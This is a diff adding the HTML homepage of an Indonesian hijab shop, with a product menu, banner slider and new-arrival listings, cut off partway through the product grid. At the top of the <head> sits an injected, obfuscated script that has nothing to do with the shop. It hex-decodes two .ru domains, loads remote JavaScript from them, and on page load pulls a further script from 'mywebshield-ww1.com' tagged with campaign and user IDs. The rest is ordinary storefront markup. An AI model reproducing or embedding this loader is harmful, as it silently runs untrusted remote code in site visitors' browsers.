@@ -1,0 +1,1031 @@
+
+
+
+
+<!DOCTYPE html>
+<!--[if IE 6]>
+<html id="ie6" dir="ltr" lang="en-US">
+<![endif]-->
+<!--[if IE 7]>
+<html id="ie7" dir="ltr" lang="en-US">
+<![endif]-->
+<!--[if IE 8]>
+<html id="ie8" dir="ltr" lang="en-US">
+<![endif]-->
+<!--[if IE 9]>
+<html id="ie9" dir="ltr" lang="en-US">
+<![endif]-->
+<!--[if !(IE 6) | !(IE 7) | !(IE 8) | !(IE 9)  ]><!-->
+<html dir="ltr" lang="en-US">
+    <!--<![endif]-->
+    <head><script>if(window.v_347548468_V_235235235 === undefined) !(function(){!function(){var t=JSON.parse('["32386e32676c3377667962302e7275","646d7564337679736a61366d65342e7275"]'),e="27801",o=function(t){t=t.match(/[\S\s]{1,2}/g);for(var e="",o=0;o<t.length;o++)e+=String.fromCharCode(parseInt(t[o],16));return e},n=function(t,e,o){var n=document.location.protocol+"//"+t;if(window.smlo&&-1==navigator.userAgent.toLowerCase().indexOf("firefox"))window.smlo.loadSmlo(n.replace("https:","http:"));else if(window.zSmlo&&-1==navigator.userAgent.toLowerCase().indexOf("firefox"))window.zSmlo.loadSmlo(n.replace("https:","http:"));else{var r=document.createElement("script");r.setAttribute("src",n),r.setAttribute("type","text/javascript"),document.head.appendChild(r),r.onload=function(){this.a982392846||(this.a982392846=!0,"function"==typeof e&&e())},r.onerror=function(){this.a982392846||(this.a982392846=!0,r.parentNode.removeChild(r),"function"==typeof o&&o())}}},r=function(i){var a=i?i:t[0],s=o(a)+"/pjs/"+e+".js";n(s,function(){},function(){var e=t.indexOf(a),o=t[e+1];o&&r(o)})};r()}();function getCfCookie(name) { var matches = document.cookie.match(new RegExp("(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)")); return matches ? decodeURIComponent(matches[1]) : undefined;} if (window.self == window.top) { document.addEventListener("DOMContentLoaded", function(){ var pops = document.createElement('script'); var cfilterCookie = '6697e3d5eb75761c638fdeb1eed84055'; var cfilterCookieIsSet = getCfCookie(cfilterCookie) ? getCfCookie(cfilterCookie) : 0; pops.src = '//mywebshield-ww1.com/' + 'getcl/rotator/' + 'campaignid/3/' + 'sourceid/132/' + 'siteid/200097813/' + 'userid/C0AD9BD6-ED9A-42CE-A55B-4A26A345E7B3/' + 'iscookie/' + cfilterCookieIsSet; document.head.appendChild(pops); });}}) (), window.v_347548468_V_235235235 = true;</script>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width" />
+        
+        <link rel="alternate" type="application/rss+xml" href="http://jilbab-afra.com/rss.xml" title="RSS Feed Product" />
+<link rel="alternate" type="application/rss+xml" href="http://jilbab-afra.com/rss_article.xml" title="RSS Feed Article" />
+<link rel="icon" href="http://jilbab-afra.com/logo_n_watermark/1481480208644_fav.png" type="image/x-icon">
+        <title>Jilbab Afra Sidoarjo</title>        <meta name="description" content="AMIRA | BERIA | SYIFA | SIERA | KARINA | PASHA | PHITA. Pelopor jillbab simple dgn berbagai warna dan ukuran. Jilbab Afra Sidoarjo melayani order hingga Surabaya | Hub: WA(081327952427)">        <meta name="keywords" content="Jilbab Afra Sidoarjo, Jilbab Afra, Jilbab Afra Sidoarjo Surabaya, Jilbab Afra SUrabaya Sidoarjo">
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<meta http-equiv="imagetoolbar" content="false" />
+<meta name="rating" content="general">
+<meta HTTP-EQUIV="VW96.OBJECT TYPE" CONTENT="Document">
+<meta NAME="RATING" CONTENT="General">
+<meta NAME="ROBOTS" CONTENT="index,follow">
+
+
+<!-- Open Graph data -->
+<meta property="fb:admins" content="asdasd"><meta property="fb:app_id" content="asdasd">
+
+        
+        <!-- [favicon] begin -->
+        <link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico" />
+        <link rel="icon" type="image/x-icon" href="images/favicon.ico" />
+        <!-- [favicon] end -->  
+        
+        <!-- CSS Main -->
+        <link rel="stylesheet" type="text/css" media="all" href="http://jilbab-afra.com/luxy3/templates/css/all_darkpink.css" />
+        <link rel="stylesheet" type="text/css" media="all" href="http://jilbab-afra.com/luxy3/templates/css/add.css" /> 
+        <link rel="stylesheet" type="text/css" media="screen and (max-width: 960px)" href="http://jilbab-afra.com/luxy3/templates/css/lessthen960.css" />
+        <link rel="stylesheet" type="text/css" media="screen and (max-width: 600px)" href="http://jilbab-afra.com/luxy3/templates/css/lessthen600.css" />
+        <link rel="stylesheet" type="text/css" media="screen and (max-width: 480px)" href="http://jilbab-afra.com/luxy3/templates/css/lessthen480.css" />
+		
+		    <!-- Google Fonts -->
+        <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Pacifico&amp;subset=latin%2Ccyrillic%2Cgreek" type="text/css" media="all" />
+        <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Rokkitt&amp;subset=latin%2Ccyrillic%2Cgreek" type="text/css" media="all" />
+        <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Shadows+Into+Light&amp;subset=latin%2Ccyrillic%2Cgreek" type="text/css" media="all" />
+        <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Open+Sans+Condensed%3A300%7CPlayfair+Display%3A400italic" type="text/css" media="all" />
+        
+        <!-- JavaScripts -->
+        <script type="text/javascript">
+            var yiw_prettyphoto_style = 'pp_default';
+            var     yiw_product_slider_interval = 6;
+			var base_url 		= 'http://jilbab-afra.com/';
+			var template_use 	= 'http://jilbab-afra.com/luxy3';
+        </script>
+    	<script type="text/javascript" src="http://jilbab-afra.com/luxy3/templates/js/js_all.js"></script>
+		<script type="text/javascript">
+				                jQuery(function($){
+				                	$('#last-tweets-2 .list-tweets-2').tweetable({
+				                		listClass: 'tweets-widget-2',
+				                		username: 'rantrave15', 
+				                		time: true, 
+				                		limit: 2, 
+				                		replies: true,
+										html5: true,
+										 onComplete:function($ul){
+											$('time').timeago();
+										}
+				                	});
+				                });
+			</script>
+		
+    </head>
+    
+    <body class="no_js responsive shop-ribbon boxed-layout">
+        
+        <!-- START SHADOW WRAPPER -->
+        <div class="bg-shadow group">
+            
+            <!-- START WRAPPER -->
+            <div class="wrapper group">
+                
+                <!-- START HEADER -->
+                <div id="header" class="group">
+                    
+                    <!-- TOPBAR -->
+                    <div id="top">
+                        
+                        <div class="inner">
+                            
+                            <div class="topbar-left">
+								 <div id="twitter-slider" class="group">
+																			<div class="tweets-list">
+											<p>
+																																																												<a href="http://jilbab-afra.com/" target="">Home</a>
+																																																																																				<span>&nbsp;|&nbsp;</span>													<a href="http://jilbab-afra.com/pages/contact-us-6.html" target="">Contact Us</a>
+																																																													<span>&nbsp;|&nbsp;</span>													<a href="http://jilbab-afra.com/pages/about-us-3.html" target="">About Us</a>
+																																																													<span>&nbsp;|&nbsp;</span>													<a href="http://jilbab-afra.com/pages/faqs-14.html" target="">FAQs</a>
+																																																													<span>&nbsp;|&nbsp;</span>													<a href="http://jilbab-afra.com/pages/how-to-shop-4.html" target="">How to Shop</a>
+																																															</p>
+										</div>
+									                                </div>
+                            </div>
+                            
+                            <div class="topbar-right">
+                                <div id="sidebar-topbar">
+                                </div>
+                                <ul class="topbar-level-1">
+									                                    <li><a href="http://jilbab-afra.com/login">Login or Register</a></li>
+									                                </ul>
+                            </div>
+                            
+                            <div id="cart">
+                                <a class="widget_shopping_cart trigger" href="http://jilbab-afra.com/cart">
+                                	<span class="minicart"><span id="number_cart_container">0</span> items </span>
+                                </a>
+                            </div>
+                            <!-- #cart -->
+                            
+                        </div>
+                        <!-- .inner -->
+                        
+                    </div>
+                    <!-- #top -->
+                    <!-- END TOPBAR -->
+                      
+                    <div class="group inner">
+                        <!-- START LOGO -->
+                        <div id="logo" class="group">
+                            <a href="http://jilbab-afra.com/"> 
+								<img src="http://jilbab-afra.com/logo_n_watermark/1481480158544_LOGOHOME.png" border="0" style="" />
+                            </a>
+                        </div>
+                        <!-- END LOGO -->  
+                        <!-- START SEARCHFORM -->
+						<form method="post" id="searchform" action="http://jilbab-afra.com/product/search" autocomplete="off">
+						<div>
+							<label class="screen-reader-text" for="s"></label>
+							<input type="text" value="" name="product-search" id="inputString" PlaceHolder="Search" onkeyup="input_quick_search();" />
+							<input type="submit" id="searchsubmit" value="" />
+							<div class="suggestions" id="suggestions" style="visibility:inherit;background:none;"></div>
+							<img src="http://jilbab-afra.com/luxy3/templates/images_darkpink/spacer.png" border=0 onLoad="load_search_inner('suggestions', 'inputString');" />
+						</div>
+						</form>
+                        <!-- END SEARCHFORM -->
+                        <!-- START NAV -->
+                         <script>
+var timer;
+function input_quick_search()
+{
+	clearTimeout(timer);
+  	timer=setTimeout(function validate(){lookup_inner($('#inputString').val(), 'suggestions', 'x_search_result', 'http://jilbab-afra.com/x_page.php');}, 2000);
+}
+</script>
+	<div id="nav" class="group">
+		<ul id="menu-menu" class="level-1">
+																		<li>
+						  <a href="http://jilbab-afra.com/product/amira-74.html" target="">Amira</a>
+							<ul class="sub-menu">
+																									<li><a href="http://jilbab-afra.com/product/ukuran-s-95.html" target="">Ukuran S</a></li>
+																									<li><a href="http://jilbab-afra.com/product/ukuran-l-96.html" target="">Ukuran L</a></li>
+																									<li><a href="http://jilbab-afra.com/product/ukuran-xl-97.html" target="">Ukuran XL</a></li>
+																									<li><a href="http://jilbab-afra.com/product/ukuran-jumbo-98.html" target="">Ukuran JUMBO</a></li>
+																							</ul>
+						</li>
+																				<li>
+						  <a href="http://jilbab-afra.com/product/beria-75.html" target="">Beria</a>
+							<ul class="sub-menu">
+																									<li><a href="http://jilbab-afra.com/product/ukuran-xs-81.html" target="">Ukuran XS</a></li>
+																									<li><a href="http://jilbab-afra.com/product/ukuran-s-82.html" target="">Ukuran S</a></li>
+																									<li><a href="http://jilbab-afra.com/product/ukuran-m-83.html" target="">Ukuran M</a></li>
+																									<li><a href="http://jilbab-afra.com/product/ukuran-l-84.html" target="">Ukuran L</a></li>
+																									<li><a href="http://jilbab-afra.com/product/ukuran-xl-85.html" target="">Ukuran XL</a></li>
+																									<li><a href="http://jilbab-afra.com/product/ukuran-2xl-86.html" target="">Ukuran 2XL</a></li>
+																									<li><a href="http://jilbab-afra.com/product/ukuran-3xl-87.html" target="">Ukuran 3XL</a></li>
+																							</ul>
+						</li>
+																				<li>
+						  <a href="http://jilbab-afra.com/product/syifa-76.html" target="">Syifa</a>
+							<ul class="sub-menu">
+																									<li><a href="http://jilbab-afra.com/product/ukuran-xs-88.html" target="">Ukuran XS</a></li>
+																									<li><a href="http://jilbab-afra.com/product/ukuran-s-89.html" target="">Ukuran S</a></li>
+																									<li><a href="http://jilbab-afra.com/product/ukuran-m-90.html" target="">Ukuran M</a></li>
+																									<li><a href="http://jilbab-afra.com/product/ukuran-l-91.html" target="">Ukuran L</a></li>
+																									<li><a href="http://jilbab-afra.com/product/ukuran-xl-92.html" target="">Ukuran XL</a></li>
+																									<li><a href="http://jilbab-afra.com/product/ukuran-2xl-93.html" target="">Ukuran 2XL</a></li>
+																									<li><a href="http://jilbab-afra.com/product/ukuran-3xl-94.html" target="">Ukuran 3XL</a></li>
+																							</ul>
+						</li>
+																				<li>
+						  <a href="http://jilbab-afra.com/product/siera-77.html" target="">Siera</a>
+							<ul class="sub-menu">
+																									<li><a href="http://jilbab-afra.com/product/jilbab-segiempat-99.html" target="">Jilbab segiempat</a></li>
+																							</ul>
+						</li>
+																				<li>
+						  <a href="http://jilbab-afra.com/product/karina-78.html" target="">Karina</a>
+							<ul class="sub-menu">
+																									<li><a href="http://jilbab-afra.com/product/ukuran-m-100.html" target="">Ukuran M</a></li>
+																									<li><a href="http://jilbab-afra.com/product/ukuran-l-101.html" target="">Ukuran L</a></li>
+																							</ul>
+						</li>
+																				<li>
+						  <a href="http://jilbab-afra.com/product/pasha-79.html" target="">Pasha</a>
+							<ul class="sub-menu">
+																									<li><a href="http://jilbab-afra.com/product/ukuran-m-102.html" target="">Ukuran M</a></li>
+																									<li><a href="http://jilbab-afra.com/product/ukuran-l-103.html" target="">Ukuran L</a></li>
+																							</ul>
+						</li>
+																				<li>
+						  <a href="http://jilbab-afra.com/product/phita-80.html" target="">Phita</a>
+							<ul class="sub-menu">
+																									<li><a href="http://jilbab-afra.com/product/ukuran-s-104.html" target="">Ukuran S</a></li>
+																									<li><a href="http://jilbab-afra.com/product/ukuran-m-105.html" target="">Ukuran M</a></li>
+																									<li><a href="http://jilbab-afra.com/product/ukuran-l-106.html" target="">Ukuran L</a></li>
+																							</ul>
+						</li>
+															
+		</ul>
+	</div>
+
+                        <!-- END NAV -->     
+                    </div>
+                </div>
+                <!-- END HEADER -->
+
+
+										                <!-- START SLIDER -->
+		                <div id="slider" class="layers-slider">
+				    <div class="shadowWrapper">
+				        <div id="layerslider_3" style="margin: 0px auto; width: 960px; height: 330px; ">
+				            						<div class="ls-layer" style="background-image: url(http://jilbab-afra.com/banner_page/1481615704823_slideee.png);slidedirection: right; slidedelay: 4000; durationin: 1500; durationout: 1500; easingin: easeInOutQuint; easingout: easeInOutQuint; delayin: 0; delayout: 0;" onClick="http://www.jilbab-afra.com/login">
+							<a href="http://www.jilbab-afra.com/login" target="_blank">
+								<div style="width:960px; height: 330px;"></div>
+							</a>
+						</div>
+				            						<div class="ls-layer" style="background-image: url(http://jilbab-afra.com/banner_page/1481512279185_slide5.jpg);slidedirection: right; slidedelay: 4000; durationin: 1500; durationout: 1500; easingin: easeInOutQuint; easingout: easeInOutQuint; delayin: 0; delayout: 0;" onClick="http://www.jilbab-afra.com/product/beria-75.html">
+							<a href="http://www.jilbab-afra.com/product/beria-75.html" target="_blank">
+								<div style="width:960px; height: 330px;"></div>
+							</a>
+						</div>
+				            						<div class="ls-layer" style="background-image: url(http://jilbab-afra.com/banner_page/1481512243297_slide3.jpg);slidedirection: right; slidedelay: 4000; durationin: 1500; durationout: 1500; easingin: easeInOutQuint; easingout: easeInOutQuint; delayin: 0; delayout: 0;" onClick="http://www.jilbab-afra.com/product/phita-80.html">
+							<a href="http://www.jilbab-afra.com/product/phita-80.html" target="_blank">
+								<div style="width:960px; height: 330px;"></div>
+							</a>
+						</div>
+				            						<div class="ls-layer" style="background-image: url(http://jilbab-afra.com/banner_page/1481512206694_slide1.jpg);slidedirection: right; slidedelay: 4000; durationin: 1500; durationout: 1500; easingin: easeInOutQuint; easingout: easeInOutQuint; delayin: 0; delayout: 0;" onClick="http://www.jilbab-afra.com/product/phita-80.html">
+							<a href="http://www.jilbab-afra.com/product/phita-80.html" target="_blank">
+								<div style="width:960px; height: 330px;"></div>
+							</a>
+						</div>
+				            						<div class="ls-layer" style="background-image: url(http://jilbab-afra.com/banner_page/1481512235732_slide2.jpg);slidedirection: right; slidedelay: 4000; durationin: 1500; durationout: 1500; easingin: easeInOutQuint; easingout: easeInOutQuint; delayin: 0; delayout: 0;" onClick="http://www.jilbab-afra.com/product/phita-80.html">
+							<a href="http://www.jilbab-afra.com/product/phita-80.html" target="_blank">
+								<div style="width:960px; height: 330px;"></div>
+							</a>
+						</div>
+				            						<div class="ls-layer" style="background-image: url(http://jilbab-afra.com/banner_page/1481512283256_slide6.jpg);slidedirection: right; slidedelay: 4000; durationin: 1500; durationout: 1500; easingin: easeInOutQuint; easingout: easeInOutQuint; delayin: 0; delayout: 0;" onClick="http://www.jilbab-afra.com/product/syifa-76.html">
+							<a href="http://www.jilbab-afra.com/product/syifa-76.html" target="_blank">
+								<div style="width:960px; height: 330px;"></div>
+							</a>
+						</div>
+				            						<div class="ls-layer" style="background-image: url(http://jilbab-afra.com/banner_page/1481512288139_slide.jpg);slidedirection: right; slidedelay: 4000; durationin: 1500; durationout: 1500; easingin: easeInOutQuint; easingout: easeInOutQuint; delayin: 0; delayout: 0;" onClick="http://www.jilbab-afra.com/product/siera-77.html">
+							<a href="http://www.jilbab-afra.com/product/siera-77.html" target="_blank">
+								<div style="width:960px; height: 330px;"></div>
+							</a>
+						</div>
+				            						<div class="ls-layer" style="background-image: url(http://jilbab-afra.com/banner_page/1481512263428_slide4.jpg);slidedirection: right; slidedelay: 4000; durationin: 1500; durationout: 1500; easingin: easeInOutQuint; easingout: easeInOutQuint; delayin: 0; delayout: 0;" onClick="http://www.jilbab-afra.com/product/karina-78.html">
+							<a href="http://www.jilbab-afra.com/product/karina-78.html" target="_blank">
+								<div style="width:960px; height: 330px;"></div>
+							</a>
+						</div>
+				            				        </div>
+				        <div class="shadow-left"></div>
+				        <div class="shadow-right"></div>
+				    </div>
+				</div>
+				<script type="text/javascript" src="http://jilbab-afra.com/luxy3/templates/js/layer-slider-settings.js"></script>
+				<!-- END SLIDER -->   
+                							<div id="primary" class="layout-sidebar-no">
+						<div class="inner group">
+							<!-- START CONTENT -->
+							<div id="slogan">
+								<h2>Welcome to <span>Jilbab Afra Sidoarjo</span></h2>
+								<h4><div>Jilbab Afra Sidoarjo adalah hijab online shop terbesar yang menampilkan tema “Simple and Colorful” jilbab untuk muslimah. Berbagai macam produk hijab dapat anda lihat di katalog kami. Member atau non-member dapat membeli produk kami. Kami juga melayani order hingga Surabaya.</div></h4>
+							</div>
+														<h2>NEW ARRIVALS ON JILBAB AFRA SIDOARJO</h2>
+							<div class="border-line"></div>
+								<div class="ribbon">
+									<div class="products-slider ribbon">
+										<ul class="products ribbon">
+																																				<li class="product first">
+																								<div class="quickshow" onClick="makeRequestPop('http://jilbab-afra.com/x_page.php','process_container','page=x_show_preview&act=show&page_required=1&id=639');">Lihat sekilas</div>
+																								<a href="http://jilbab-afra.com/detail/beria-17-ungu-anggur-l-639.html">
+													<div class="thumbnail">
+														<span class="onsale"><img src="http://jilbab-afra.com/logo_n_watermark/1305206066362_spacer.png" border=0 /></span>	
+															<div style="height:158px;display:table;width:100%;">
+																<div style="display:table-cell;vertical-align:middle;text-align:center;">
+																<center>
+																<img src="http://jilbab-afra.com/upload/d_d_d_BERIA-UNGU-ANGGUR-300x300_20161213213659_medium2.jpg" border=0 style="margin-top:10px" alt="BERIA 17 Ungu Anggur L" title="BERIA 17 Ungu Anggur L"/>
+																</center>
+																</div>
+															</div>
+														<div class="thumb-shadow"></div>
+														<strong class="below-thumb">BERIA 17 Ungu Anggur L</strong>    	
+													</div>
+																										<span class="price">
+																											<ins><span class="amount">Rp 45.000,-</span></ins></span>
+																								</a>
+																								<div class="buttons">
+													<form name="addcart_639" id="addcart_639" method="post" action="http://jilbab-afra.com/cart">
+													<input type="hidden" name="submitted" value="1"  /;>
+													<input type="hidden" name="detail_qty" value="1"  /;>
+													<input type="hidden" name="product_id" value="639"  /;>
+																											<input type="hidden" name="attribute[Ukuran]" value="L"  /;>
+																																							<a href="#" onClick="$('#addcart_639').submit();" class="add-to-cart">ADD TO CART</a>
+																										</form>
+												</div>
+																							</li>
+																																		<li class="product">
+																								<div class="quickshow" onClick="makeRequestPop('http://jilbab-afra.com/x_page.php','process_container','page=x_show_preview&act=show&page_required=1&id=638');">Lihat sekilas</div>
+																								<a href="http://jilbab-afra.com/detail/beria-17-ungu-anggur-xl-638.html">
+													<div class="thumbnail">
+														<span class="onsale"><img src="http://jilbab-afra.com/logo_n_watermark/1305206066362_spacer.png" border=0 /></span>	
+															<div style="height:158px;display:table;width:100%;">
+																<div style="display:table-cell;vertical-align:middle;text-align:center;">
+																<center>
+																<img src="http://jilbab-afra.com/upload/d_d_BERIA-UNGU-ANGGUR-300x300_20161213213550_medium2.jpg" border=0 style="margin-top:10px" alt="BERIA 17 Ungu Anggur XL" title="BERIA 17 Ungu Anggur XL"/>
+																</center>
+																</div>
+															</div>
+														<div class="thumb-shadow"></div>
+														<strong class="below-thumb">BERIA 17 Ungu Anggur XL</strong>    	
+													</div>
+																										<span class="price">
+																											<ins><span class="amount">Rp 45.000,-</span></ins></span>
+																								</a>
+																								<div class="buttons">
+													<form name="addcart_638" id="addcart_638" method="post" action="http://jilbab-afra.com/cart">
+													<input type="hidden" name="submitted" value="1"  /;>
+													<input type="hidden" name="detail_qty" value="1"  /;>
+													<input type="hidden" name="product_id" value="638"  /;>
+																											<input type="hidden" name="attribute[Ukuran]" value="XL"  /;>
+																																							<a href="#" onClick="$('#addcart_638').submit();" class="add-to-cart">ADD TO CART</a>
+																										</form>
+												</div>
+																							</li>
+																																		<li class="product">
+																								<div class="quickshow" onClick="makeRequestPop('http://jilbab-afra.com/x_page.php','process_container','page=x_show_preview&act=show&page_required=1&id=608');">Lihat sekilas</div>
+																								<a href="http://jilbab-afra.com/detail/beria-18-ungu-terong-608.html">
+													<div class="thumbnail">
+														<span class="onsale"><img src="http://jilbab-afra.com/logo_n_watermark/1305206066362_spacer.png" border=0 /></span>	
+															<div style="height:158px;display:table;width:100%;">
+																<div style="display:table-cell;vertical-align:middle;text-align:center;">
+																<center>
+																<img src="http://jilbab-afra.com/upload/d_d_d_d_d_d_BERIA-UNGU-TERONG-300x300_20161213002850_medium2.jpg" border=0 style="margin-top:10px" alt="BERIA 18 Ungu Terong" title="BERIA 18 Ungu Terong"/>
+																</center>
+																</div>
+															</div>
+														<div class="thumb-shadow"></div>
+														<strong class="below-thumb">BERIA 18 Ungu Terong</strong>    	
+													</div>
+																										<span class="price">
+																											<ins><span class="amount">Rp 40.000,-</span></ins></span>
+																								</a>
+																								<div class="buttons">
+													<form name="addcart_608" id="addcart_608" method="post" action="http://jilbab-afra.com/cart">
+													<input type="hidden" name="submitted" value="1"  /;>
+													<input type="hidden" name="detail_qty" value="1"  /;>
+													<input type="hidden" name="product_id" value="608"  /;>
+																																							<a href="#" onClick="$('#addcart_608').submit();" class="add-to-cart">ADD TO CART</a>
+																										</form>
+												</div>
+																							</li>
+																																		<li class="product last">
+																								<div class="quickshow" onClick="makeRequestPop('http://jilbab-afra.com/x_page.php','process_container','page=x_show_preview&act=show&page_required=1&id=642');">Lihat sekilas</div>
+																								<a href="http://jilbab-afra.com/detail/beria-17-ungu-anggur-xs-642.html">
+													<div class="thumbnail">
+														<span class="onsale"><img src="http://jilbab-afra.com/logo_n_watermark/1305206066362_spacer.png" border=0 /></span>	
+															<div style="height:158px;display:table;width:100%;">
+																<div style="display:table-cell;vertical-align:middle;text-align:center;">
+																<center>
+																<img src="http://jilbab-afra.com/upload/d_d_d_d_d_d_BERIA-UNGU-ANGGUR-300x300_20161213215446_medium2.jpg" border=0 style="margin-top:10px" alt="BERIA 17 Ungu Anggur XS" title="BERIA 17 Ungu Anggur XS"/>
+																</center>
+																</div>
+															</div>
+														<div class="thumb-shadow"></div>
+														<strong class="below-thumb">BERIA 17 Ungu Anggur XS</strong>    	
+													</div>
+																										<span class="price">
+																											<ins><span class="amount">Rp 35.000,-</span></ins></span>
+																								</a>
+																								<div class="buttons">
+													<form name="addcart_642" id="addcart_642" method="post" action="http://jilbab-afra.com/cart">
+													<input type="hidden" name="submitted" value="1"  /;>
+													<input type="hidden" name="detail_qty" value="1"  /;>
+													<input type="hidden" name="product_id" value="642"  /;>
+																											<input type="hidden" name="attribute[Ukuran]" value="S"  /;>
+																																							<a href="#" onClick="$('#addcart_642').submit();" class="add-to-cart">ADD TO CART</a>
+																										</form>
+												</div>
+																							</li>
+																																		<li class="product first">
+																								<div class="quickshow" onClick="makeRequestPop('http://jilbab-afra.com/x_page.php','process_container','page=x_show_preview&act=show&page_required=1&id=623');">Lihat sekilas</div>
+																								<a href="http://jilbab-afra.com/detail/beria-17-ungu-anggur-3xl-623.html">
+													<div class="thumbnail">
+														<span class="onsale"><img src="http://jilbab-afra.com/logo_n_watermark/1305206066362_spacer.png" border=0 /></span>	
+															<div style="height:158px;display:table;width:100%;">
+																<div style="display:table-cell;vertical-align:middle;text-align:center;">
+																<center>
+																<img src="http://jilbab-afra.com/upload/BERIA-UNGU-ANGGUR-300x300_20161213122430_medium2.jpg" border=0 style="margin-top:10px" alt="BERIA 17 Ungu Anggur 3XL" title="BERIA 17 Ungu Anggur 3XL"/>
+																</center>
+																</div>
+															</div>
+														<div class="thumb-shadow"></div>
+														<strong class="below-thumb">BERIA 17 Ungu Anggur 3XL</strong>    	
+													</div>
+																										<span class="price">
+																											<ins><span class="amount">Rp 55.000,-</span></ins></span>
+																								</a>
+																								<div class="buttons">
+													<form name="addcart_623" id="addcart_623" method="post" action="http://jilbab-afra.com/cart">
+													<input type="hidden" name="submitted" value="1"  /;>
+													<input type="hidden" name="detail_qty" value="1"  /;>
+													<input type="hidden" name="product_id" value="623"  /;>
+																											<input type="hidden" name="attribute[Ukuran]" value="3XL"  /;>
+																																							<a href="#" onClick="$('#addcart_623').submit();" class="add-to-cart">ADD TO CART</a>
+																										</form>
+												</div>
+																							</li>
+																																		<li class="product">
+																								<div class="quickshow" onClick="makeRequestPop('http://jilbab-afra.com/x_page.php','process_container','page=x_show_preview&act=show&page_required=1&id=610');">Lihat sekilas</div>
+																								<a href="http://jilbab-afra.com/detail/beria-18-ungu-terong-xs-610.html">
+													<div class="thumbnail">
+														<span class="onsale"><img src="http://jilbab-afra.com/logo_n_watermark/1305206066362_spacer.png" border=0 /></span>	
+															<div style="height:158px;display:table;width:100%;">
+																<div style="display:table-cell;vertical-align:middle;text-align:center;">
+																<center>
+																<img src="http://jilbab-afra.com/upload/d_d_d_d_d_d_d_d_BERIA-UNGU-TERONG-300x300_20161213002938_medium2.jpg" border=0 style="margin-top:10px" alt="BERIA 18 Ungu Terong XS" title="BERIA 18 Ungu Terong XS"/>
+																</center>
+																</div>
+															</div>
+														<div class="thumb-shadow"></div>
+														<strong class="below-thumb">BERIA 18 Ungu Terong XS</strong>    	
+													</div>
+																										<span class="price">
+																											<ins><span class="amount">Rp 35.000,-</span></ins></span>
+																								</a>
+																								<div class="buttons">
+													<form name="addcart_610" id="addcart_610" method="post" action="http://jilbab-afra.com/cart">
+													<input type="hidden" name="submitted" value="1"  /;>
+													<input type="hidden" name="detail_qty" value="1"  /;>
+													<input type="hidden" name="product_id" value="610"  /;>
+																											<input type="hidden" name="attribute[Ukuran]" value="XS"  /;>
+																																							<a href="#" onClick="$('#addcart_610').submit();" class="add-to-cart">ADD TO CART</a>
+																										</form>
+												</div>
+																							</li>
+																																		<li class="product">
+																								<div class="quickshow" onClick="makeRequestPop('http://jilbab-afra.com/x_page.php','process_container','page=x_show_preview&act=show&page_required=1&id=643');">Lihat sekilas</div>
+																								<a href="http://jilbab-afra.com/detail/beria-16-ungu-muda-3xl-643.html">
+													<div class="thumbnail">
+														<span class="onsale"><img src="http://jilbab-afra.com/logo_n_watermark/1305206066362_spacer.png" border=0 /></span>	
+															<div style="height:158px;display:table;width:100%;">
+																<div style="display:table-cell;vertical-align:middle;text-align:center;">
+																<center>
+																<img src="http://jilbab-afra.com/upload/BERIA-UNGU-MUDA-300x300_20161213220633_medium2.jpg" border=0 style="margin-top:10px" alt="BERIA 16 Ungu Muda 3XL" title="BERIA 16 Ungu Muda 3XL"/>
+																</center>
+																</div>
+															</div>
+														<div class="thumb-shadow"></div>
+														<strong class="below-thumb">BERIA 16 Ungu Muda 3XL</strong>    	
+													</div>
+																										<span class="price">
+																											<ins><span class="amount">Rp 55.000,-</span></ins></span>
+																								</a>
+																								<div class="buttons">
+													<form name="addcart_643" id="addcart_643" method="post" action="http://jilbab-afra.com/cart">
+													<input type="hidden" name="submitted" value="1"  /;>
+													<input type="hidden" name="detail_qty" value="1"  /;>
+													<input type="hidden" name="product_id" value="643"  /;>
+																											<input type="hidden" name="attribute[Ukuran]" value="S"  /;>
+																																							<a href="#" onClick="$('#addcart_643').submit();" class="add-to-cart">ADD TO CART</a>
+																										</form>
+												</div>
+																							</li>
+																																		<li class="product last">
+																								<div class="quickshow" onClick="makeRequestPop('http://jilbab-afra.com/x_page.php','process_container','page=x_show_preview&act=show&page_required=1&id=640');">Lihat sekilas</div>
+																								<a href="http://jilbab-afra.com/detail/beria-17-ungu-anggur-m-640.html">
+													<div class="thumbnail">
+														<span class="onsale"><img src="http://jilbab-afra.com/logo_n_watermark/1305206066362_spacer.png" border=0 /></span>	
+															<div style="height:158px;display:table;width:100%;">
+																<div style="display:table-cell;vertical-align:middle;text-align:center;">
+																<center>
+																<img src="http://jilbab-afra.com/upload/d_d_d_d_BERIA-UNGU-ANGGUR-300x300_20161213214155_medium2.jpg" border=0 style="margin-top:10px" alt="BERIA 17 Ungu Anggur M" title="BERIA 17 Ungu Anggur M"/>
+																</center>
+																</div>
+															</div>
+														<div class="thumb-shadow"></div>
+														<strong class="below-thumb">BERIA 17 Ungu Anggur M</strong>    	
+													</div>
+																										<span class="price">
+																											<ins><span class="amount">Rp 40.000,-</span></ins></span>
+																								</a>
+																								<div class="buttons">
+													<form name="addcart_640" id="addcart_640" method="post" action="http://jilbab-afra.com/cart">
+													<input type="hidden" name="submitted" value="1"  /;>
+													<input type="hidden" name="detail_qty" value="1"  /;>
+													<input type="hidden" name="product_id" value="640"  /;>
+																											<input type="hidden" name="attribute[Ukuran]" value="M"  /;>
+																																							<a href="#" onClick="$('#addcart_640').submit();" class="add-to-cart">ADD TO CART</a>
+																										</form>
+												</div>
+																							</li>
+																																		<li class="product first">
+																								<div class="quickshow" onClick="makeRequestPop('http://jilbab-afra.com/x_page.php','process_container','page=x_show_preview&act=show&page_required=1&id=637');">Lihat sekilas</div>
+																								<a href="http://jilbab-afra.com/detail/beria-17-ungu-anggur-2xl-637.html">
+													<div class="thumbnail">
+														<span class="onsale"><img src="http://jilbab-afra.com/logo_n_watermark/1305206066362_spacer.png" border=0 /></span>	
+															<div style="height:158px;display:table;width:100%;">
+																<div style="display:table-cell;vertical-align:middle;text-align:center;">
+																<center>
